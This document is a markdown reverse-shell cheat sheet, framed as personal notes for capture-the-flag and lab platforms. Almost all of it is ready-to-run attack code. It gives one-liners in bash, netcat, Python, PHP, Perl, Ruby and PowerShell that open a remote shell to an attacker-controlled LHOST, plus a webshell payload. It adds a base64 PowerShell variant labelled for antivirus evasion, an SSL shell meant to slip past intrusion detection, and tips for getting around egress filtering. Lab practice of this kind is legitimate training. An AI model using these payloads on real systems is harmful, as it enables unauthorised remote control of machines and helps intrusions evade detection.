# Reverse Shells — One-Liner Reference

Curated one-liners I rely on during HTB / TryHackMe / CTF work.
Replace `LHOST` with your attacker IP and `LPORT` with your listener port.

> Always start your listener first: `nc -lvnp 4444` or `rlwrap -cAr nc -lvnp 4444`

---

## Bash

### Most reliable bash reverse shell (modern bash)
```bash
bash -i >& /dev/tcp/LHOST/LPORT 0>&1
```

### Bash without `/dev/tcp` (uses `nc`)
```bash
nc -e /bin/bash LHOST LPORT
```

### When `nc` lacks `-e` (Debian/Ubuntu default)
```bash
mkfifo /tmp/p; nc LHOST LPORT < /tmp/p | /bin/bash > /tmp/p 2>&1; rm /tmp/p
```

---

## Python

### Python 3 (preferred)
```python
python3 -c 'import os,pty,socket;s=socket.socket();s.connect(("LHOST",LPORT));[os.dup2(s.fileno(),f) for f in (0,1,2)];pty.spawn("/bin/bash")'
```

### Python 2 (legacy targets)
```python
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("LHOST",LPORT));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'
```

---

## PHP

```php
php -r '$sock=fsockopen("LHOST",LPORT);exec("/bin/sh -i <&3 >&3 2>&3");'
```

For a full payload to drop on a webshell:
```php
<?php exec("/bin/bash -c 'bash -i >& /dev/tcp/LHOST/LPORT 0>&1'"); ?>
```

---

## Perl

```perl
perl -e 'use Socket;$i="LHOST";$p=LPORT;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
```

---

## Ruby

```ruby
ruby -rsocket -e 'exit if fork;c=TCPSocket.new("LHOST","LPORT");while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end'
```

---

## PowerShell (Windows)

### Plain PowerShell reverse shell
```powershell
$client = New-Object System.Net.Sockets.TCPClient("LHOST",LPORT);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
```

### Base64-encoded one-liner (AV evasion)
```bash
# encode on Linux:
echo -n '<powershell payload>' | iconv -t UTF-16LE | base64 -w0
# run on target:
powershell -NoP -NonI -W Hidden -Exec Bypass -Enc <BASE64>
```

---

## Netcat — every flavor

| Variant | Command |
|---|---|
| Traditional `nc` (`-e`) | `nc -e /bin/bash LHOST LPORT` |
| OpenBSD `nc` (`-c`) | `nc -c bash LHOST LPORT` |
| `ncat` | `ncat LHOST LPORT -e /bin/bash` |
| FIFO trick | `mkfifo /tmp/p; nc LHOST LPORT < /tmp/p \| /bin/bash > /tmp/p 2>&1; rm /tmp/p` |

---

## TTY Upgrade (after getting a dumb shell)

```bash
# 1. Spawn a real PTY
python3 -c 'import pty; pty.spawn("/bin/bash")'

# 2. Background the shell
Ctrl+Z

# 3. On your attacker box
stty raw -echo; fg

# 4. Press Enter, then in the shell
export TERM=xterm
export SHELL=/bin/bash
stty rows 40 columns 200
```

Now you have arrow keys, tab completion, and `Ctrl+C` won't kill the shell.

---

## Listener options

### Plain netcat
```bash
nc -lvnp 4444
```

### With readline support (recommended)
```bash
rlwrap -cAr nc -lvnp 4444
```

### Multi-handler with metasploit
```bash
msfconsole -q -x "use exploit/multi/handler; set PAYLOAD linux/x64/shell_reverse_tcp; set LHOST 0.0.0.0; set LPORT 4444; run"
```

---

## SSL-encrypted reverse shell (bypasses some IDS)

```bash
# Listener
ncat --ssl -lvnp 4444

# Target
ncat --ssl LHOST 4444 -e /bin/bash
```

---

## When egress is restricted

Try these ports — they're commonly allowed outbound:
- `80` (HTTP)
- `443` (HTTPS)
- `53` (DNS) — sometimes
- `8080` (HTTP-alt)
- `21` (FTP)

If only HTTP/HTTPS is allowed, look into:
- **Chisel** for tunneling
- **DNS exfil tools** (`iodine`, `dnscat2`)
- **HTTP-based shells** (`SharpC2`, `merlin`)

---

## References

- [PayloadsAllTheThings — Reverse Shell Cheatsheet](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md)
- [HighOn.Coffee — Reverse Shell Cheat Sheet](https://highon.coffee/blog/reverse-shell-cheat-sheet/)
- [revshells.com](https://www.revshells.com/) — interactive generator
